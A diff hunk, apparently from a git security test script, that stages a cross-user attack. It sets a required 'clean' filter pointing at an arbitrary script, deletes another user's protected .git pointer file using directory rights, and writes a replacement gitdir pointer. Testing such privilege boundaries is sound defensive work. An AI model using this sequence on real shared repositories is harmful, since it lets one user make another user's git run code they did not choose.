@@ -8152,6 +8152,10 @@ chmod +x "$3"
 git --git-dir="$2" config filter.x.clean "$3"
 git --git-dir="$2" config filter.x.required true
 git --git-dir="$2" config core.worktree "$5"
+# The protected A-owned pointer is not writable by B. The attack replaces
+# its directory entry using B's checkout-directory rights instead.
+test ! -w "$5/.git"
+rm "$5/.git"
 printf 'gitdir: %s\n' "$2" > "$5/.git"
 printf 'src/keep filter=x\n' > "$5/.gitattributes"
 printf 'changed!\n' > "$5/src/keep"
